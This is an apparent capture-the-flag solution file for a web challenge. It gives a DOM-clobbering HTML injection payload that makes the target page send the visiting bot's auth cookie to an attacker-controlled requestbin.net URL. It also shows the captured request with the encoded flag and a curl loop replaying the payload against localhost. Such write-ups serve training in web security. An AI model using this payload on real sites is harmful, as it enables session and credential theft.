@@ -1,0 +1,32 @@
+Example using : https://requestbin.net/r/8f0fh70o
+
+Submit this as your image URL:
+
+https://requestbin.net/r/8f0fh70o/my-fake-image"><p id="DEBUG_MODE"></p><a id="DEBUG_LOGGING_URL" href="https://requestbin.net/r/8f0fh70o/">hello</a><p alt="sam
+
+The id="DEBUG_MODE" introduces, in effect, a DEBUG_MODE global variable into javascript with a truthy value.
+The id="DEBUG_LOGGING_URL" does the same BUT it is an anchor tag and when the global variable is coerced
+into a string, it will evaluate to the href value that you control.
+
+Then take the full URL from the address bar and submit it to the evaluator:
+
+https://wsc-2022-web-2-bvel4oasra-uc.a.run.app/personalize?image=https%3A%2F%2Frequestbin.net%2Fr%2F8f0fh70o%2Fmy-fake-image%22%3E%3Cp+id%3D%22DEBUG_MODE%22%3E%3C%2Fp%3E%3Ca+id%3D%22DEBUG_LOGGING_URL%22+href%3D%22https%3A%2F%2Frequestbin.net%2Fr%2F8f0fh70o%2F%22%3Ehello%3C%2Fa%3E%3Cp+alt%3D%22sam
+
+should see this logged to requestbin.net
+
+QUERYSTRING
+auth: ZmxhZz13c2N7ZDBtX2NsMGJiM3IxbmdfMTVfZnVufQ==
+
+image: aHR0cHM6Ly9yZXF1ZXN0YmluLm5ldC9yLzhmMGZoNzBvL215LWZha2UtaW1hZ2U=
+
+GET /?auth=ZmxhZz1HTFNDe2QwbV9jbDBiYjNyMW5nXzE1X2Z1bn0=&image=aHR0cHM6Ly9jN2o0cjlzMnZ0YzAwMDA5cjU2MGdkM25jZnl5eXl5eWIuaW50ZXJhY3Quc2gvbXktZmFrZS1pbWFnZQ== HTTP/2.0
+
+decode the auth param to get the flag.
+
+
+[Testing Notes]
+
+I did some quick/dirty load testing on my laptop by firing up the zsh shell and running commands like this:
+
+repeat 20 {curl 'http://localhost/visit'   -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"'   -H 'sec-ch-ua-mobile: ?0'   -H 'sec-ch-ua-platform: "macOS"'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://localhost'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Sec-Fetch-Site: same-origin'   -H 'Sec-Fetch-Mode: navigate'   -H 'Sec-Fetch-User: ?1'   -H 'Sec-Fetch-Dest: document'   -H 'Referer: http://localhost/'   -H 'Accept-Language: en-US,en;q=0.9'   -H $'Cookie: flag=WOOT\u0021'   -H 'sec-gpc: 1'   --data-raw 'url=http%3A%2F%2Flocalhost%2Fpersonalize%3Fimage%3Dhttps%253A%252F%252Frequestbin.net%252Fr%252F6ikzanjw%252Fmy-fake-image%2522%253E%253Cp%2Bid%253D%2522DEBUG_MODE%2522%253E%253C%252Fp%253E%253Ca%2Bid%253D%2522DEBUG_LOGGING_URL%2522%2Bhref%253D%2522https%253A%252F%252Frequestbin.net%252Fr%252F6ikzanjw%252F%2522%253Ehello%253C%252Fa%253E%253Cp%2Balt%253D%2522sam'   --compressed&}
+
